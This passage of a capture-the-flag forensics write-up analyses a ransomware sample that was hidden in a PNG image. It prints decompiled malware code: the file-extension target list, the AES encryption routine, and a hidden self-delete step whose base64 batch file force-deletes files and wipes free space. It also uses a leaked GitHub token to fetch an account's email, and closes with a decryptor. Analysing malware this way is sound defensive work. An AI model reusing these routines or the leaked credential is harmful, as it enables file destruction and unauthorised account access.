height * (width * mode + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> calculated_raw_idat_length &lt; <span class="built_in">len</span>(idat_data):</span><br><span class="line">        buffer = idat_data[calculated_raw_idat_length:]</span><br><span class="line">        buffer = buffer[<span class="number">1259</span>:]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(buffer)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;File: <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&#x27;muki_pic.png&#x27;</span></span><br><span class="line">output_file = <span class="string">&#x27;OpenVpnConnect.exe&#x27;</span></span><br><span class="line"></span><br><span class="line">file_from_png(input_file, output_file)</span><br></pre></td></tr></table></figure></div>
+
+<p>Once we have the dropped file, we can easily get its hash.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\tamin\Desktop\for_it-ran-somewhere&gt;certutil -hashfile OpenVpnConnect.exe md5</span><br><span class="line">MD5 hash of OpenVpnConnect.exe:</span><br><span class="line">8eaa25eb8b77ac0157e1f3a04ad47e93</span><br><span class="line">CertUtil: -hashfile command completed successfully.</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Question-5-What-is-the-token-used-by-the-malware-to-access-the-private-repository-and-the-name-of-the-private-repository"><a href="#Question-5-What-is-the-token-used-by-the-malware-to-access-the-private-repository-and-the-name-of-the-private-repository" class="headerlink" title="Question 5: What is the token used by the malware to access the private repository and the name of the private repository?"></a>Question 5: What is the token used by the malware to access the private repository and the name of the private repository?</h4><p>After analyzing the source code, we can easily answer this question with the answer being <code>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:velbail/contimtanvo</code></p>
+<h4 id="Question-6-What-is-the-email-address-of-the-culprit"><a href="#Question-6-What-is-the-email-address-of-the-culprit" class="headerlink" title="Question 6: What is the email address of the culprit?"></a>Question 6: What is the email address of the culprit?</h4><p>Once we have the token, we can completely extract the email account of the github account containing this malicious repo.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tmqrx@TMQ:~$ curl -H &quot;Authorization: token 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&quot; https://api.github.com/user/emails</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;email&quot;: &quot;belvail@proton.me&quot;,</span><br><span class="line">    &quot;primary&quot;: true,</span><br><span class="line">    &quot;verified&quot;: true,</span><br><span class="line">    &quot;visibility&quot;: &quot;public&quot;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Question-7-How-many-extensions-did-the-malware-try-to-encrypt"><a href="#Question-7-How-many-extensions-did-the-malware-try-to-encrypt" class="headerlink" title="Question 7: How many extensions did the malware try to encrypt?"></a>Question 7: How many extensions did the malware try to encrypt?</h4><p>Using DIE to analyze the dropped file, we see that it is compiled in .NET, so we can use DnSpy or Dotpeek to analyze it.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/wannagame/wannagame8.png"
+                      alt="image"
+                ></p>
+<p>Analyzing the source code, in the class <code>hoincus2</code> we see that the function <code>isCool</code> returns a list of 52 extensions that will be encrypted.</p>
+<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">isCool</span>(<span class="params"><span class="built_in">string</span> path</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> ((IEnumerable&lt;<span class="built_in">string</span>&gt;) <span class="keyword">new</span> <span class="built_in">string</span>[<span class="number">52</span>]</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;.pdf&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.exe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.doc&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.docx&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.xls&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.xlsx&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.pptx&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.txt&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.zip&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.rar&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.7z&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.mp3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.mp4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.avi&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.mkv&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.mov&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.flv&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.wmv&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.wav&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.wma&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.ogg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.flac&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.aac&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.m4a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.mpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.mpeg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.m4v&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.webm&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.dat&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.iso&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.rar&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.tar&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.gz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.bz2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.tgz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.xz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.html&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.css&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.js&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.bin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.dll&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.jpeg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.bmp&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.gif&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.tiff&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.ico&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.svg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.webp&quot;</span></span><br><span class="line">      &#125;).Contains&lt;<span class="built_in">string</span>&gt;(Path.GetExtension(path));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Question-8-The-malware-tried-to-delete-itself-using-a-batch-file-What-is-the-MD5-hash-of-the-batch-file"><a href="#Question-8-The-malware-tried-to-delete-itself-using-a-batch-file-What-is-the-MD5-hash-of-the-batch-file" class="headerlink" title="Question 8: The malware tried to delete itself using a batch file. What is the MD5 hash of the batch file?"></a>Question 8: The malware tried to delete itself using a batch file. What is the MD5 hash of the batch file?</h4><p>Analyzing the source code, we see that in the <code>Program</code> class, it is encrypting the file in the Documents folder using the AES algorithm. In the <code>kal902y103</code> function, we can see that it is creating a .bat file and a base64 string containing malicious commands. Then call cmd to execute the .bat file.</p>
+<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">kal902y103</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">string</span> fileName = Process.GetCurrentProcess().MainModule.FileName;</span><br><span class="line">      <span class="built_in">string</span> contents = Encoding.UTF8.GetString(Convert.FromBase64String(<span class="string">&quot;QGVjaG8gb2ZmCnRpbWVvdXQgL3QgNSA+bnVsCmRlbCAvZiAvcSAiJX4xIgpjaXBoZXIgL3c6IkM6XFVzZXJzIiA+TlVMCihkZWwgL3EgL2YgIiV+ZjAiID5OVUwgMj4mMSAmIGV4aXQgL2IgMCk=&quot;</span>));</span><br><span class="line">      <span class="built_in">string</span> path = Path.GetTempPath() + <span class="string">&quot;gugugaga.bat&quot;</span>;</span><br><span class="line">      File.WriteAllText(path, contents);</span><br><span class="line">      <span class="keyword">new</span> Process()</span><br><span class="line">      &#123;</span><br><span class="line">        StartInfo = <span class="keyword">new</span> ProcessStartInfo()</span><br><span class="line">        &#123;</span><br><span class="line">          WindowStyle = ProcessWindowStyle.Hidden,</span><br><span class="line">          FileName = <span class="string">&quot;cmd.exe&quot;</span>,</span><br><span class="line">          Arguments = (<span class="string">&quot;/c &quot;</span> + path + <span class="string">&quot; &quot;</span> + fileName),</span><br><span class="line">          CreateNoWindow = <span class="literal">false</span>,</span><br><span class="line">          UseShellExecute = <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;.Start();</span><br><span class="line">      Environment.Exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/wannagame/wannagame9.png"
+                      alt="image"
+                ></p>
+<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] <span class="keyword">args</span></span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> batFilePath = Path.Combine(Path.GetTempPath(), <span class="string">&quot;gugugaga.bat&quot;</span>);</span><br><span class="line">        <span class="built_in">string</span> batContent = Encoding.UTF8.GetString(Convert.FromBase64String(</span><br><span class="line">            <span class="string">&quot;QGVjaG8gb2ZmCnRpbWVvdXQgL3QgNSA+bnVsCmRlbCAvZiAvcSAiJX4xIgpjaXBoZXIgL3c6IkM6XFVzZXJzIiA+TlVMCihkZWwgL3EgL2YgIiV+ZjAiID5OVUwgMj4mMSAmIGV4aXQgL2IgMCk=&quot;</span></span><br><span class="line">        ));</span><br><span class="line">        File.WriteAllText(batFilePath, batContent);</span><br><span class="line">        Console.WriteLine(<span class="string">$&quot;<span class="subst">&#123;batFilePath&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>We can recreate the .bat file and get its hash.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\tamin\AppData\Local\Temp&gt;certutil -hashfile gugugaga.bat md5</span><br><span class="line">MD5 hash of gugugaga.bat:</span><br><span class="line">e0d005db63a75fbcd6c8fa85040095aa</span><br><span class="line">CertUtil: -hashfile command completed successfully.</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Question-9-Recover-the-content-of-‘password-xlsx’-file-What-is-the-username-and-password-of-the-fifth-record"><a href="#Question-9-Recover-the-content-of-‘password-xlsx’-file-What-is-the-username-and-password-of-the-fifth-record" class="headerlink" title="Question 9: Recover the content of ‘password.xlsx’ file. What is the username and password of the fifth record?"></a>Question 9: Recover the content of ‘password.xlsx’ file. What is the username and password of the fifth record?</h4><p>We see that in the asjkh82828 class, the AES key is created by getting the MachineGuid in the Registry. Then use it with the salt to create the AES key. Since the salt is hardcoded, we only need to parse the registry hive to find the MachineGuid and we can get the AES key to decrypt the file.</p>
+<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">asjkh82828</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">daoiawoadhowidoiawdwao0</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">string</span> s1 = Registry.LocalMachine.OpenSubKey(<span class="string">&quot;SOFTWARE\\Microsoft\\Cryptography&quot;</span>).GetValue(<span class="string">&quot;MachineGuid&quot;</span>).ToString();</span><br><span class="line">      <span class="built_in">string</span> s2 = <span class="string">&quot;supershy-supershy&quot;</span>;</span><br><span class="line">      <span class="keyword">using</span> (Rfc2898DeriveBytes rfc2898DeriveBytes = <span class="keyword">new</span> Rfc2898DeriveBytes(Encoding.UTF8.GetBytes(s1), Encoding.UTF8.GetBytes(s2), <span class="number">1259</span>))</span><br><span class="line">        <span class="keyword">return</span> rfc2898DeriveBytes.GetBytes(<span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">n8912c9821n</span>(<span class="params"><span class="built_in">byte</span>[] data, <span class="built_in">byte</span>[] key</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">using</span> (Aes aes = Aes.Create())</span><br><span class="line">      &#123;</span><br><span class="line">        aes.Key = key;</span><br><span class="line">        aes.IV = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">16</span>];</span><br><span class="line">        aes.Mode = CipherMode.CBC;</span><br><span class="line">        aes.Padding = PaddingMode.PKCS7;</span><br><span class="line">        <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">using</span> (CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream((Stream) memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))</span><br><span class="line">            cryptoStream.Write(data, <span class="number">0</span>, data.Length);</span><br><span class="line">          <span class="built_in">byte</span>[] array = memoryStream.ToArray();</span><br><span class="line">          Array.Resize&lt;<span class="built_in">byte</span>&gt;(<span class="keyword">ref</span> array, array.Length + <span class="number">16</span>);</span><br><span class="line">          Array.Copy((Array) aes.IV, <span class="number">0</span>, (Array) array, array.Length - <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">          <span class="keyword">return</span> array;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Solve script:</p>
+<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">RansomwareDecryptor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] <span class="keyword">args</span></span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> machineGuid = <span class="string">&quot;2c65d206-5a9f-40a0-ae87-3d10c27b40c7&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> encryptedFolder = <span class="string">@&quot;D:\z&quot;</span>;</span><br><span class="line">        <span class="built_in">byte</span>[] key = GenerateKey(machineGuid);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="built_in">string</span> encryptedFilePath <span class="keyword">in</span> Directory.GetFiles(encryptedFolder, <span class="string">&quot;*.uocj&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;<span class="subst">&#123;encryptedFilePath&#125;</span>&quot;</span>);</span><br><span class="line">                <span class="built_in">string</span> decryptedFilePath = encryptedFilePath.Substring(<span class="number">0</span>, encryptedFilePath.Length - <span class="number">5</span>);</span><br><span class="line">                DecryptFile(encryptedFilePath, decryptedFilePath, key);</span><br><span class="line">                File.Delete(encryptedFilePath);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;<span class="subst">&#123;decryptedFilePath&#125;</span>&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;<span class="subst">&#123;encryptedFilePath&#125;</span>: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;donee&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">GenerateKey</span>(<span class="params"><span class="built_in">string</span> machineGuid</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> salt = <span class="string">&quot;supershy-supershy&quot;</span>;</span><br><span class="line">        <span class="keyword">using</span> (Rfc2898DeriveBytes rfc2898 = <span class="keyword">new</span> Rfc2898DeriveBytes(Encoding.UTF8.GetBytes(machineGuid), Encoding.UTF8.GetBytes(salt), <span class="number">1259</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> rfc2898.GetBytes(<span class="number">32</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">DecryptFile</span>(<span class="params"><span class="built_in">string</span> encryptedFilePath, <span class="built_in">string</span> decryptedFilePath, <span class="built_in">byte</span>[] key</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">byte</span>[] encryptedData = File.ReadAllBytes(encryptedFilePath);</span><br><span class="line">        <span class="built_in">byte</span>[] iv = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">16</span>];</span><br><span class="line">        Array.Copy(encryptedData, encryptedData.Length - <span class="number">16</span>, iv, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">        <span class="built_in">byte</span>[] cipherText = <span class="keyword">new</span> <span class="built_in">byte</span>[encryptedData.Length - <span class="number">16</span>];</span><br><span class="line">        Array.Copy(encryptedData, <span class="number">0</span>, cipherText, <span class="number">0</span>, cipherText.Length);</span><br><span class="line">        <span class="keyword">using</span> (Aes aes = Aes.Create())</span><br><span class="line">        &#123;</span><br><span class="line">            aes.Key = key;</span><br><span class="line">            aes.IV = iv;</span><br><span class="line">            aes.Mode = CipherMode.CBC;</span><br><span class="line">            aes.Padding = PaddingMode.PKCS7;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">using</span> (CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))</span><br><span class="line">                &#123;</span><br><span class="line">                    cryptoStream.Write(cipherText, <span class="number">0</span>, cipherText.Length);</span><br><span class="line">                    cryptoStream.FlushFinalBlock();</span><br><span class="line">                &#125;</span><br><span class="line">                File.WriteAllBytes(decryptedFilePath, memoryStream.ToArray());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/wannagame/wannagame10.png"
+                      alt="image"
+                ></p>
+<blockquote>
+<p>TLDR: I have first solve this chall lol</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/wannagame/wannagame11.png"
+                      alt="image"
+                ></p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> WANNAGAME CHAMPIONSHIP 2024</li>
+        <li><strong>Author:</strong> TMQ</li>
+        <li><strong>Created at
+                :</strong> 2025-03-21 18:18:24</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-03-21 19:21:03
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/03/21/Wannagame-Champsionship-2024-CTF-Writeup/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+
+		
+
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">WANNAGAME CHAMPIONSHIP 2024</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Forensics"><span class="nav-text">Forensics</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#it-ran-somewhere"><span class="nav-text">it ran somewhere</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">TMQ</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        1 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
